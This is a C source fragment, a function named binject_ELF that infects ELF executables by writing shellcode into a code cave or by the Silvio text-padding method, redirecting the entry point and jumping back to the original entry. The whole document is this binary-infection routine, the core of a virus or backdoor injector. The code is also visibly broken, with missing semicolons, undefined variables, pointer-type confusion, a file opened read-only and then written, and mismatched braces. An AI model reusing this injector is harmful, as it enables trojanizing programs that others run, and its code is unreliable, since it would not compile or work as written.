int binject_ELF(char *file,char *shellcode,int method)
{
  uint32_t size,oryginal_entry;
  int i,x;
  int sclen=strlen(shellcode);
  FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
 size=ftell(f);
  char *file_buffer = calloc(1,size);
  char *address=file_buffer;
  struct Elf32_Ehdr ehdr=(struct Elf32_Ehdr*)address;
  oryginal_entry=ehdr.e_entry;
  if(method==CODE_CAVE)
  {
	  address+=ehdr->e_shoff;
  for(i=0;i<ehdr.shnum;i++)
  {       
	  struct Elf32_shdr shdr=(struct Elf32_Shdr*)address;
	  uint32_t section_start=Shdr->sh_offset;
	  uint32_t section_end=Shdr->sh_offset + shdr->sh_size;
       x=find_code_cave(sclen,section_start,section_end,file_buffer);
                        if(x!=0)
			{
			sclen+=5
		 char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,oryginal_entry,0) 
                        memcpy(file_buffer+x,shellcodefixed,sclen)
			fwrite(file_buffer,1,size,f);
			free(shellcodefixed);
			free(file_buffer);
			fclose(f);
			return 0;
		        
			}
				section_start+=shdr->sh_size;
  }
                      return -1;
                        }
  if(method==SILVIO_METHOD)
  {
	  sclen+=5;
	  x=0;
	  address+=ehdr->e_phoff
	  for (i = 0; i < ehdr.e_phnum; i++) {
		  struct Elf32_phdr phdr= (struct Elf32_phdr*)address;
		if (x) {
			phdr->p_offset += 4096;
		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
			
			ehdr.e_entry = phdr->p_vaddr+phdr->p_filesz;
			int palen;

			if (phdr->p_filesz != phdr->p_memsz) return-1;

			
			palen = PAGE_SIZE - (ehdr.e_entry & (PAGE_SIZE - 1));

			if (palen < sclen)
			

			ehdr.e_entry = evaddr + ventry;
			x = phdr->p_offset + phdr->p_filesz;

			phdr->p_filesz += sclen;
			phdr->p_memsz += sclen;
		}

		address+=phdr->filesz;
	}
	  if (offset == 0) 
		  return -1;
address=file_buffer+ehdr->e_shoff;
	for ( i = 0; i < ehdr.e_shnum; i++) {
		struct Elf32_Shdr shdr = (struct Elf32_Shdr*)address;
		if (shdr->sh_offset >= offset) {
			shdr->sh_offset += PAGE_SIZE;
		                                } 
		else if (shdr->sh_addr + shdr->sh_size == evaddr) {
			if (shdr->sh_type != SHT_PROGBITS) return -1;

			shdr->sh_size += sclen;
		                                                   }

		address+=shdr->sh_size;
	}
	if (ehdr.e_shoff >= x) 
	ehdr.e_shoff += PAGE_SIZE;
	  char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,oryginal_entry,0) 
memcpy(file_buffer+x,shellcodefixed,sclen);
  fwrite(file_buffer,1,size,f);
  free(shellcodefixed);
  free(file_buffer);
  fclose(f);
  return 0;
}
   return -1;        
 
}
